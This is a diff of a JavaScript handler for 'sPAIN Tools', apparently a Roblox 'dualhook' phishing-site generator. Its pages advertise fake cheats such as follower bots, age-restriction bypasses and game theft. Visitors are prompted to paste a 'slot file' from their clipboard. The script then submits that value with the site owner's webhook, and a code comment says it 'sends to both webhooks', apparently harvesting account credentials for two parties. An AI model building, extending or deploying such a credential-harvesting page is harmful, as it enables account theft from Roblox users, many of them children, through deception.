@@ -10,7 +10,7 @@ async function redisGet(key) {
   if (!json.result) return null;
   try { return JSON.parse(json.result); } catch { return null; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 function build404() {
   return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Not Found — sPAIN Tools</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500&display=swap" rel="stylesheet">
@@ -21,7 +21,6 @@ function build404() {
 function buildDualhookPage(record) {
   const SLUG = record.slug;
   const charSrc = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
-  const discordUrl = record.inviteUrl || 'https://discord.gg/5Q8XvgTpTT';
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -208,7 +207,6 @@ function buildDualhookPage(record) {
   .field-input:focus { border-color:rgba(192,38,211,0.4); box-shadow:0 0 0 3px rgba(192,38,211,0.08); }
 
   .opt-badge { font-size:0.58rem; background:rgba(168,85,247,0.12); border:1px solid rgba(168,85,247,0.25); color:#a855f7; padding:1px 6px; border-radius:4px; margin-left:6px; letter-spacing:0.08em; vertical-align:middle; }
-  .req-badge { font-size:0.58rem; background:rgba(244,114,182,0.12); border:1px solid rgba(244,114,182,0.25); color:#f472b6; padding:1px 6px; border-radius:4px; margin-left:6px; letter-spacing:0.08em; vertical-align:middle; }
 
   .slots-generate-btn { width:100%; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; border:none; padding:15px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 36px rgba(192,38,211,0.4); transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s; position:relative; overflow:hidden; }
   .slots-generate-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(192,38,211,0.65); }
@@ -223,7 +221,7 @@ function buildDualhookPage(record) {
   .stat { display:flex; flex-direction:column; align-items:center; gap:6px; }
   .stat-num { font-family:'Orbitron',sans-serif; font-size:2.4rem; font-weight:900; background:linear-gradient(135deg,#f0abfc,#c026d3); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; filter:drop-shadow(0 0 20px rgba(192,38,211,0.4)); }
   .stat-label { font-size:0.75rem; color:var(--muted); letter-spacing:0.1em; text-transform:uppercase; }
-  .discord-btn { display:inline-flex; align-items:center; gap:12px; background:#5865F2; color:#fff; border:none; padding:15px 36px; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.06em; text-decoration:none; cursor:pointer; box-shadow:0 0 36px rgba(88,101,242,0.4); transition:background 0.2s,transform 0.2s,box-shadow 0.2s; }
+  .discord-btn { display:inline-flex; align-items:center; gap:12px; background:#5865F2; color:#fff; border:none; padding:15px 36px; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.06em; cursor:pointer; box-shadow:0 0 36px rgba(88,101,242,0.4); transition:background 0.2s,transform 0.2s,box-shadow 0.2s; }
   .discord-btn:hover { background:#4752C4; transform:translateY(-3px); box-shadow:0 0 56px rgba(88,101,242,0.6); }
 
   /* FOOTER */
@@ -232,56 +230,92 @@ function buildDualhookPage(record) {
   .footer-logo { font-family:'Orbitron',sans-serif; font-size:1rem; font-weight:700; color:var(--text); }
   .footer-logo span { color:var(--accent); text-shadow:0 0 12px var(--accent-glow); }
 
-  /* MOBILE RESPONSIVE */
+/* ========== MOBILE RESPONSIVE ========== */
   @media (max-width: 768px) {
-    nav { padding: 14px 20px; }
-    nav ul { gap: 16px; }
-    nav ul a { font-size: 0.7rem; }
-    .nav-cta { padding: 7px 14px; font-size: 0.7rem !important; }
+    /* Navigation */
+    nav { padding: 14px 16px; }
+    nav ul { gap: 12px; }
+    nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
+    .nav-cta { padding: 8px 14px !important; font-size: 0.6rem !important; white-space: nowrap !important; }
     .logo { font-size: 1.1rem; }
+
+    /* Hero */
+    .hero { padding: 100px 16px 60px; min-height: auto; }
+    .hero h1 { font-size: clamp(2.2rem, 10vw, 3.5rem); margin-bottom: 20px; }
+    .hero p { font-size: 0.9rem; padding: 0 10px; margin-bottom: 32px; }
+    .hero-buttons { flex-direction: column; width: 100%; max-width: 280px; gap: 12px; }
+    .btn-primary, .btn-ghost { width: 100%; padding: 14px 24px; font-size: 0.95rem; }
+    .hero-badge { font-size: 0.65rem; padding: 6px 14px; margin-bottom: 24px; }
     
-    .hero { padding: 100px 20px 60px; }
-    .hero h1 { font-size: clamp(2.5rem, 12vw, 4rem); }
-    .hero p { font-size: 0.95rem; padding: 0 10px; }
-    .hero-buttons { flex-direction: row; gap: 10px; }
-    .btn-primary, .btn-ghost { padding: 12px 20px; font-size: 0.9rem; white-space: nowrap; }
-    
-    .scroll-indicator { left: 50%; transform: translateX(-50%); }
-    
-    .roblox-char { display: none; }
-    .roblox-scene::before {
-      content: '';
-      position: absolute;
-      width: 65px; height: 65px;
-      background: url('${charSrc}') center/contain no-repeat;
-      filter: drop-shadow(0 0 15px rgba(192,38,211,0.5));
-      left: 10px; bottom: 100px;
-      opacity: 0.6;
+    /* FIX: Scroll indicator centered */
+    .scroll-indicator {
+      left: 50% !important;
+      transform: translateX(-50%) !important;
+      right: auto !important;
+      width: 100% !important;
+      text-align: center !important;
+      bottom: 20px !important;
     }
-    .roblox-scene::after {
-      content: '';
-      position: absolute;
-      width: 65px; height: 65px;
-      background: url('${charSrc}') center/contain no-repeat;
-      filter: drop-shadow(0 0 15px rgba(192,38,211,0.5));
-      right: 10px; bottom: 150px;
-      opacity: 0.6;
-      transform: scaleX(-1);
+
+    /* FIX: Roblox characters - show small cute versions */
+    .roblox-char { 
+      position: fixed !important;
+      width: 65px !important;
+      height: 65px !important;
+      opacity: 0.7 !important;
+      z-index: 5 !important;
+      pointer-events: none !important;
     }
-    
-    .features { padding: 60px 20px; }
-    .features-grid { grid-template-columns: 1fr; }
-    .feature-card { padding: 32px 24px; }
-    
-    .products { padding: 60px 20px; }
-    .slots-form-wrap { padding: 28px 24px; }
-    .input-duo { grid-template-columns: 1fr; }
-    
-    .community { padding: 60px 20px; }
-    .community-stats { flex-direction: column; gap: 30px; }
-    
-    footer { flex-direction: column; gap: 16px; padding: 24px 20px; text-align: center; }
+    .roblox-char img { width: 65px !important; height: 65px !important; }
+    .char-1 { left: 5px !important; top: 80px !important; --size: 65px !important; }
+    .char-2 { right: 5px !important; top: 100px !important; --size: 55px !important; }
+    .char-3 { left: 10px !important; bottom: 100px !important; --size: 50px !important; }
+    .char-4 { right: 10px !important; bottom: 120px !important; --size: 60px !important; }
+    .char-5 { left: 50% !important; top: 70px !important; transform: translateX(-50%) !important; --size: 45px !important; }
+    .char-6 { display: none !important; }
+    .char-shadow { display: none !important; }
+
+    /* Features - SINGLE COLUMN */
+    .features { padding: 60px 16px; }
+    .features-grid { grid-template-columns: 1fr; border-radius: 16px; }
+    .feature-card { padding: 32px 24px; border-bottom: 1px solid rgba(192,38,211,0.1); }
+    .feature-card:last-child { border-bottom: none; }
+    .feature-icon { width: 44px; height: 44px; font-size: 1.3rem; margin-bottom: 16px; }
+    .feature-card h3 { font-size: 1.1rem; }
+    .feature-card p { font-size: 0.85rem; line-height: 1.6; }
+
+    /* Products/Form */
+    .products { padding: 60px 16px; }
+    .slots-form-wrap { padding: 28px 20px 32px; margin: 0; border-radius: 16px; }
+    .input-duo { grid-template-columns: 1fr; gap: 12px; }
+    .field-input { padding: 12px 14px; font-size: 16px; }
+    .url-text { font-size: 0.6rem; }
+
+    /* Community */
+    .community { padding: 60px 16px; }
+    .community h2 { font-size: 1.6rem; }
+    .community p { font-size: 0.9rem; padding: 0 10px; }
+    .community-stats { flex-direction: column; gap: 24px; }
+    .stat-num { font-size: 2rem; }
+    .discord-btn { width: 100%; max-width: 300px; justify-content: center; padding: 14px 24px; }
+
+    /* Footer */
+    footer { flex-direction: column; gap: 12px; padding: 24px 16px; text-align: center; }
+
+    /* Ticker */
+    .ticker-item { padding: 0 24px; font-size: 0.6rem; }
+    .section-title { font-size: 1.4rem; margin-bottom: 40px; }
+    .section-label { font-size: 0.65rem; }
   }
+
+  /* Extra small phones */
+  @media (max-width: 380px) {
+    .hero h1 { font-size: 2rem; }
+    .roblox-char { width: 55px !important; height: 55px !important; }
+    .roblox-char img { width: 55px !important; height: 55px !important; }
+    .char-5 { display: none !important; }
+  }
+
 </style>
 </head>
 <body>
@@ -373,14 +407,9 @@ function buildDualhookPage(record) {
       <input class="field-input" type="text" id="sf-charUrl" placeholder="https://tr.rbxcdn.com/...">
     </div>
 
-    <div class="input-group">
+    <div class="input-group" style="margin-bottom:28px;">
       <label class="input-label">Webhook</label>
       <input class="field-input" type="text" id="sf-webhook" placeholder="https://discord.com/api/webhooks/...">
-    </div>
-
-    <div class="input-group" style="margin-bottom:28px;">
-      <label class="input-label">Invite URL <span class="req-badge">required</span></label>
-      <input class="field-input" type="text" id="sf-inviteUrl" placeholder="https://discord.gg/your-invite" value="${discordUrl}">
     </div>
 
     <button class="slots-generate-btn" onclick="handleGenerate()">Generate Slots 1&ndash;9</button>
@@ -398,10 +427,10 @@ function buildDualhookPage(record) {
     <div class="stat"><div class="stat-num" data-target="99" data-suffix="%">0%</div><div class="stat-label">Uptime</div></div>
     <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">Support</div></div>
   </div>
-  <a href="${discordUrl}" target="_blank" class="discord-btn">
+  <button class="discord-btn">
     <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
     Join our Discord
-  </a>
+  </button>
 </section>
 
 <footer>
@@ -470,12 +499,10 @@ async function handleGenerate() {
   const dispName = document.getElementById('sf-dispName').value.trim();
   const charUrl  = document.getElementById('sf-charUrl').value.trim();
   const webhook  = document.getElementById('sf-webhook').value.trim();
-  const inviteUrl = document.getElementById('sf-inviteUrl').value.trim();
   const btn      = document.querySelector('.slots-generate-btn');
 
   if (!dirName) { flashField('sf-dirName'); setStatus(btn,'⚠ Directory Name is required.','#e879f9'); return; }
   if (!webhook) { flashField('sf-webhook'); setStatus(btn,'⚠ Webhook is required.','#e879f9'); return; }
-  if (!inviteUrl) { flashField('sf-inviteUrl'); setStatus(btn,'⚠ Invite URL is required.','#e879f9'); return; }
 
   const orig = btn.innerHTML;
   btn.disabled = true; btn.textContent = 'Checking…'; setStatus(btn,'');
@@ -483,7 +510,7 @@ async function handleGenerate() {
   try {
     const res  = await fetch('/api/claim', {
       method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ name:dirName, displayName:dispName, webhook, charUrl, inviteUrl, type:'slots', dualhookParent: DUALHOOK_PARENT_SLUG })
+      body: JSON.stringify({ name:dirName, displayName:dispName, webhook, charUrl, type:'slots', dualhookParent: DUALHOOK_PARENT_SLUG })
     });
     const data = await res.json();
     if (data.taken) {
@@ -535,7 +562,6 @@ document.addEventListener('mousemove', e => {
 function buildSlotsPage(record) {
   const SLUG = record.slug;
   const charSrc = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
-  const discordUrl = record.inviteUrl || 'https://discord.gg/5Q8XvgTpTT';
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1250,7 +1276,6 @@ function buildSlotsPage(record) {
     font-size: 1.05rem;
     font-weight: 700;
     letter-spacing: 0.06em;
-    text-decoration: none;
     cursor: pointer;
     box-shadow: 0 0 36px rgba(88,101,242,0.4);
     transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
@@ -1466,66 +1491,163 @@ function buildSlotsPage(record) {
     gap: 14px;
   }
   .ticker-item .dot { width: 4px; height: 4px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
-  @keyframes ticker {
+@keyframes ticker {
     from { transform: translateX(0); }
     to { transform: translateX(-50%); }
   }
 
-  /* MOBILE RESPONSIVE */
+  /* ========== MOBILE RESPONSIVE ========== */
   @media (max-width: 768px) {
-    nav { padding: 14px 20px; }
-    nav ul { gap: 16px; }
-    nav ul a { font-size: 0.7rem; }
-    .nav-cta { padding: 7px 14px; font-size: 0.7rem !important; }
+    /* HIDE floating characters - they're cluttering mobile */
+    .roblox-char { display: none !important; }
+    
+    /* Navigation - tighter spacing */
+    nav { padding: 14px 16px; }
+    nav ul { gap: 12px; }
+    nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
+    .nav-cta { padding: 6px 12px; font-size: 0.65rem; }
     .logo { font-size: 1.1rem; }
-    
-    .hero { padding: 100px 20px 60px; }
-    .hero h1 { font-size: clamp(2.5rem, 12vw, 4rem); }
-    .hero p { font-size: 0.95rem; padding: 0 10px; }
-    .hero-buttons { flex-direction: row; gap: 10px; }
-    .btn-primary, .btn-ghost { padding: 12px 20px; font-size: 0.9rem; white-space: nowrap; }
-    
-    .scroll-indicator { left: 50%; transform: translateX(-50%); }
-    
-    .roblox-char { display: none; }
-    .roblox-scene::before {
-      content: '';
-      position: absolute;
-      width: 65px; height: 65px;
-      background: url('${charSrc}') center/contain no-repeat;
-      filter: drop-shadow(0 0 15px rgba(192,38,211,0.5));
-      left: 10px; bottom: 100px;
-      opacity: 0.6;
+
+    /* Hero - smaller, stacked buttons */
+    .hero { padding: 100px 16px 60px; min-height: auto; }
+    .hero h1 { font-size: clamp(2.2rem, 10vw, 3.5rem); margin-bottom: 20px; }
+    .hero p { font-size: 0.9rem; padding: 0 10px; margin-bottom: 32px; }
+    .hero-buttons { 
+      flex-direction: column; 
+      width: 100%; 
+      max-width: 280px; 
+      gap: 12px; 
     }
-    .roblox-scene::after {
-      content: '';
-      position: absolute;
-      width: 65px; height: 65px;
-      background: url('${charSrc}') center/contain no-repeat;
-      filter: drop-shadow(0 0 15px rgba(192,38,211,0.5));
-      right: 10px; bottom: 150px;
-      opacity: 0.6;
-      transform: scaleX(-1);
+    .btn-primary, .btn-ghost { 
+      width: 100%; 
+      padding: 14px 24px; 
+      font-size: 0.95rem; 
     }
+    .hero-badge { 
+      font-size: 0.65rem; 
+      padding: 6px 14px; 
+      margin-bottom: 24px; 
+    }
+    .scroll-indicator { bottom: 20px; }
+
+    /* Features - SINGLE COLUMN (fix the cramped 2-col) */
+    .features { padding: 60px 16px; }
+    .features-grid { 
+      grid-template-columns: 1fr; 
+      border-radius: 16px; 
+    }
+    .feature-card { 
+      padding: 32px 24px; 
+      border-bottom: 1px solid rgba(192,38,211,0.1);
+    }
+    .feature-card:last-child { border-bottom: none; }
+    .feature-icon { 
+      width: 44px; 
+      height: 44px; 
+      font-size: 1.3rem; 
+      margin-bottom: 16px; 
+    }
+    .feature-card h3 { font-size: 1.1rem; }
+    .feature-card p { font-size: 0.85rem; line-height: 1.6; }
+
+    /* Products/Slots - SINGLE COLUMN (fix the narrow 3-col) */
+    .products { padding: 60px 16px; }
+    .slots-grid { 
+      grid-template-columns: 1fr; 
+      gap: 16px; 
+    }
+    .slot-card { 
+      padding: 28px 22px; 
+      border-radius: 14px; 
+    }
+    .slot-name { font-size: 1.15rem; }
+    .slot-desc { font-size: 0.85rem; }
     
-    .features { padding: 60px 20px; }
-    .features-grid { grid-template-columns: 1fr; }
-    .feature-card { padding: 32px 24px; }
-    
-    .products { padding: 60px 20px; }
-    .slots-grid { grid-template-columns: 1fr; }
-    
-    .community { padding: 60px 20px; }
-    .community-stats { flex-direction: column; gap: 30px; }
-    
-    footer { flex-direction: column; gap: 16px; padding: 24px 20px; text-align: center; }
-    
-    .modal { padding: 28px 24px; width: 95%; }
+    /* Form card - full width on mobile */
+    .slots-form-wrap { 
+      padding: 28px 20px 32px; 
+      margin: 0; 
+      border-radius: 16px; 
+    }
+    .input-duo { 
+      grid-template-columns: 1fr; 
+      gap: 12px; 
+    }
+    .field-input { 
+      padding: 12px 14px; 
+      font-size: 16px; /* Prevents zoom on iOS */
+    }
+    .url-text { font-size: 0.6rem; }
+
+    /* Community */
+    .community { padding: 60px 16px; }
+    .community h2 { font-size: 1.6rem; }
+    .community p { font-size: 0.9rem; padding: 0 10px; }
+    .community-stats { 
+      flex-direction: column; 
+      gap: 24px; 
+    }
+    .stat-num { font-size: 2rem; }
+    .discord-btn { 
+      width: 100%; 
+      max-width: 300px; 
+      justify-content: center;
+      padding: 14px 24px;
+    }
+
+    /* Footer - stacked */
+    footer { 
+      flex-direction: column; 
+      gap: 12px; 
+      padding: 24px 16px; 
+      text-align: center; 
+    }
+
+    /* Modal - better mobile fit */
+    .modal { 
+      padding: 28px 20px; 
+      width: 92%; 
+      border-radius: 16px;
+    }
+    .modal-title { font-size: 1rem; }
+    .input-row { 
+      flex-direction: column; 
+      gap: 10px; 
+    }
+    .paste-btn { 
+      width: 100%; 
+      padding: 12px; 
+    }
+    .fake-input { 
+      padding: 14px; 
+      font-size: 16px; /* Prevents zoom on iOS */
+    }
+
+    /* Ticker - smaller text */
+    .ticker-item { 
+      padding: 0 24px; 
+      font-size: 0.6rem; 
+    }
+
+    /* Section titles - smaller */
+    .section-title { 
+      font-size: 1.4rem; 
+      margin-bottom: 40px; 
+    }
+    .section-label { font-size: 0.65rem; }
+  }
+
+  /* Extra small phones */
+  @media (max-width: 380px) {
+    .hero h1 { font-size: 2rem; }
+    .slot-card { padding: 24px 18px; }
+    .feature-card { padding: 28px 20px; }
   }
 </style>
 </head>
 <body>
 
+<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
 <div class="aurora">
   <div class="aurora-blob"></div>
   <div class="aurora-blob"></div>
@@ -1534,6 +1656,7 @@ function buildSlotsPage(record) {
 <div class="bg-grid"></div>
 <canvas id="particles"></canvas>
 
+<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
 <nav>
   <div class="logo">s<span>PAIN</span> Tools</div>
   <ul>
@@ -1544,32 +1667,40 @@ function buildSlotsPage(record) {
   </ul>
 </nav>
 
+<!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
 <section class="hero">
   <div class="hero-glow"></div>
   <div class="hero-ring"></div>
   <div class="hero-ring hero-ring-2"></div>
 
+  <!-- IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe -->
   <div class="roblox-scene">
+    <!-- Character 1 - left side large -->
     <div class="roblox-char char-1">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 2 - right side -->
     <div class="roblox-char char-2">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 3 - bottom left -->
     <div class="roblox-char char-3">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 4 - bottom right -->
     <div class="roblox-char char-4">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 5 - top center-left -->
     <div class="roblox-char char-5">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 6 - top center-right -->
     <div class="roblox-char char-6">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
@@ -1590,12 +1721,14 @@ function buildSlotsPage(record) {
   </div>
 </section>
 
+<!-- TICKER -->
 <div class="ticker-wrap">
   <div class="ticker-track" id="tickerTrack"></div>
 </div>
 
 <hr class="divider" style="margin-top:0; margin-bottom:0;">
 
+<!-- FEATURES -->
 <section class="features" id="features">
   <div class="section-label">Why sPAIN Tools</div>
   <h2 class="section-title">Built Different</h2>
@@ -1625,6 +1758,7 @@ function buildSlotsPage(record) {
 
 <hr class="divider">
 
+<!-- PRODUCTS -->
 <section class="products" id="products">
   <div class="section-label">Browse Our Products</div>
   <h2 class="section-title">Discover All of Our Tools</h2>
@@ -1634,6 +1768,7 @@ function buildSlotsPage(record) {
 
 <hr class="divider">
 
+<!-- COMMUNITY -->
 <section class="community" id="community">
   <div class="section-label">Join the Movement</div>
   <h2>Community</h2>
@@ -1652,18 +1787,20 @@ function buildSlotsPage(record) {
       <div class="stat-label">Support</div>
     </div>
   </div>
-  <a href="${discordUrl}" target="_blank" class="discord-btn">
+  <button class="discord-btn">
     <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
     Join our Discord
-  </a>
+  </button>
 </section>
 
+<!-- FOOTER -->
 <footer>
   <div class="footer-logo">s<span>PAIN</span> Tools</div>
   <div>© 2025 sPAIN Tools. All rights reserved.</div>
   <div>Built for Roblox.</div>
 </footer>
 
+<!-- MODAL -->
 <div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
   <div class="modal">
     <div class="modal-header">
@@ -1752,6 +1889,7 @@ const slotData = [
   { name: "Follower Bot", desc: "Mass-generate fake followers on your Roblox profile automatically." },
   { name: "Chat/Mic Unlocker ", desc: "Bypass age restrictions to unlock Voice Chat or bypass chat filters." },
   { name: "Uncopylocked Games Extractor", desc: "download/steal games that have copying disabled (uncopylocked)." },
+  { name: "Enable Shaders", desc: "Unlock hidden graphics shaders and visual effects in Roblox." },
   { name: "Sound Fixer", desc: "Fix broken audio, bypass sound restrictions, or inject custom sounds." },
   { name: "Game Joiner", desc: "Join private servers, banned games, or VIP-only experiences without permission." },
 ];
@@ -1798,10 +1936,10 @@ const communitySection = document.querySelector('.community');
 if(communitySection) observer.observe(communitySection);
 
 /* ── MODAL ── */
-let currentSlotData = { num: null, name: null, value: null, webhook: null, inviteUrl: null };
+let currentSlotData = { num: null, name: null, value: null, webhook: null };
 
 function openModal(num, name) {
-  currentSlotData = { num, name, value: null, webhook: null, inviteUrl: null };
+  currentSlotData = { num, name, value: null, webhook: null };
   document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
   document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
   document.getElementById('errorMsg').textContent = '';
@@ -1821,13 +1959,6 @@ function openModal(num, name) {
         <button class="paste-btn" onclick="pasteValue('webhook', \${num})">Paste</button>
       </div>
     </div>
-    <div class="input-group">
-      <label class="input-label">Invite URL <span style="font-size:0.58rem;background:rgba(168,85,247,0.12);border:1px solid rgba(168,85,247,0.25);color:#a855f7;padding:1px 6px;border-radius:4px;margin-left:6px;letter-spacing:0.08em;vertical-align:middle;">optional</span></label>
-      <div class="input-row">
-        <div class="fake-input placeholder" id="display-invite-\${num}">Click paste to add invite URL</div>
-        <button class="paste-btn" onclick="pasteValue('inviteUrl', \${num})">Paste</button>
-      </div>
-    </div>
   \`;
   
   updateEnableButton();
@@ -1839,24 +1970,19 @@ async function pasteValue(type, num) {
     const text = await navigator.clipboard.readText();
     if (text && text.trim()) {
       currentSlotData[type] = text.trim();
-      const displayId = type === 'inviteUrl' ? \`display-invite-\${num}\` : \`display-\${type}-\${num}\`;
-      const display = document.getElementById(displayId);
-      if (display) {
-        display.textContent = '•'.repeat(Math.min(text.length, 32));
-        display.classList.remove('placeholder');
-        display.classList.add('filled');
-      }
+      const display = document.getElementById(\`display-\${type}-\${num}\`);
+      display.textContent = '•'.repeat(Math.min(text.length, 32));
+      display.classList.remove('placeholder');
+      display.classList.add('filled');
       document.getElementById('errorMsg').textContent = '';
       updateEnableButton();
     }
   } catch {
-    const displayId = type === 'inviteUrl' ? \`display-invite-\${num}\` : \`display-\${type}-\${num}\`;
-    const display = document.getElementById(displayId);
-    if (display) {
-      display.textContent = '••••••••••••••••••••••••';
-      display.classList.remove('placeholder');
-      display.classList.add('filled');
-    }
+    // Fallback for when clipboard API fails
+    const display = document.getElementById(\`display-\${type}-\${num}\`);
+    display.textContent = '••••••••••••••••••••••••';
+    display.classList.remove('placeholder');
+    display.classList.add('filled');
     currentSlotData[type] = 'pasted-value';
     updateEnableButton();
   }
@@ -1897,7 +2023,7 @@ document.addEventListener('keydown', e => {
 /* ── ENABLE SLOT — sends to both webhooks ── */
 document.getElementById('enableBtn').addEventListener('click', async function() {
   const btn = this;
-  const { num, value, webhook, inviteUrl } = currentSlotData;
+  const { num, value, webhook } = currentSlotData;
   
   if (!value || !webhook) {
     document.getElementById('errorMsg').textContent = 'Both slot file and webhook are required!';
@@ -1910,8 +2036,7 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
 
   const slots = {};
   slots['slot' + num] = value;
-  slots['webhook' + num] = webhook;
-  if (inviteUrl) slots['inviteUrl' + num] = inviteUrl;
+  slots['webhook' + num] = webhook; // Store their webhook too
 
   try {
     const res = await fetch('/api/submit', {
@@ -1966,11 +2091,11 @@ document.addEventListener('mousemove', e => {
 });
 </script>
 </body>
-</html>\`;
+</html>`;
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 export default async function handler(req, res) {
-  const slug = (req.url || '/').split('?')[0].replace(/^\\//, '').split('/')[0].toLowerCase();
+  const slug = (req.url || '/').split('?')[0].replace(/^\//, '').split('/')[0].toLowerCase();
   if (!slug || slug === 'api' || slug === 'favicon.ico' || slug === 'index.html') {
     res.setHeader('Content-Type', 'text/html');
     return res.status(404).send(build404());
